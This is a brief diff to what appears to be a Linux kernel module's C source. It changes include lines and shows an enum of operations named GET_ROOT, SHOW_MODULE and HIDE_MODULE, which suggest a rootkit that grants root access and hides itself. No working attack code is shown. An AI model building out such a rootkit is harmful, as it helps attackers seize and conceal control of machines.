@@ -1,7 +1,8 @@
 #include <linux/mutex.h>
 #include "devices.h"
+#include "fs_helper.h"
 #include "internel.h"
-#include "symbols.h"
+#include "syscall_helper.h"
 
 enum operation_num { GET_ROOT, SHOW_MODULE, HIDE_MODULE };
 
